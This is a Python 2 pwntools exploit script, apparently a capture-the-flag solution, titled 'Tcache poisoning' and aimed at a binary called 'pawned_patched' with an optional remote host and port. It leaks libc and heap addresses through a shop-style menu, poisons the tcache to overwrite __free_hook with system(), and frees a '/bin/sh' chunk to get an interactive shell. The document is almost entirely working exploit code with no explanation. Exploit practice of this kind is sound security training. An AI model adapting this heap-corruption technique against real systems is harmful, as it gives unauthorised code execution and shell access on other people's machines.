Tcache poisoning 

```python
#!/usr/bin/python2
from pwn import *
from sys import *
from pprint import pprint as pp


context.arch = "amd64"
# context.arch = "i386"

libc = ELF('libc-2.31', checksec=False)
#libc = ELF('/usr/lib32/libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)        
e = ELF('pawned_patched')


context.arch = "amd64"

if(len(argv) == 2):
    p = connect("193.57.159.27", 46343)
else:
    p = process('pawned_patched')




def sell(itemprice, itemlength, itemname):
    p.sendlineafter("> ", "S")
    p.sendlineafter(": ", str(itemprice))
    p.sendlineafter(": ", str(itemlength))
    p.sendline(itemname)

def buy(index):
    p.sendlineafter("> ", "B")
    index = index + 1
    p.sendlineafter("?: ", str(index))
    return null

def leave():
    return null

def printitems(index):
    p.sendlineafter('> ', "P")
    data = p.recvuntil("\n\n", drop=True)
    data = data.split("\n")
    price = data[index].split(',')[0].split('$')[1]
    name = data[index].split(': ')[1]    
    return price, name



def manage(index, itemprice, itemlength, itemname):
    index = index + 1
    p.sendlineafter("> ", "M")
    p.sendlineafter(": ", str(index))
    p.sendlineafter(": ", str(itemprice))
    p.sendlineafter(": ", str(itemlength))
    p.sendline(itemname)

# def manage(inde)
cmd = """
#heap-analysis-helper

pie 0x00000000000018E6
"""
if(len(argv) == 3):
    gdb.attach(p, cmd)

sell(0x4242, 0x9, 'A') # 0
sell(0x4242, 0x9, 'A') # 1
sell(0x4242, 0x9, 'A') # 2

sell(0x1000, 0x1000, 'A') # 3
sell(0x4242, 0x40, '') # 4
buy(2)
buy(3)
# p.interactive()
price, name = printitems(3)
# try:
libcleak = u64(name.ljust(8, '\x00'))
print price, hex(libcleak)



libc.address = libcleak - 0x1ebbe0
print hex(libc.address)
freehook = libc.symbols['__free_hook']
print hex(freehook)

# sell(0x40, 0x40, 'a')
# sell(0x40, 0x40, 'a')

sell(0x1000, 0x1000, 'AAAA') # 5
sell(0x4242, 0x40, '/bin/sh') # 6
sell(0x4242, 0x40, 'BBBB') # 7

buy(0)


price, name = printitems(0)
heapleak = u64(name.ljust(8, '\x00'))
print price, hex(heapleak)


# buy(1)
manage(0, 0, 9 , p64(freehook))
sell(0x4242, 9, 'A')
sell(0x4242, 9, p64(libc.symbols.system))

buy(6)

p.interactive()
```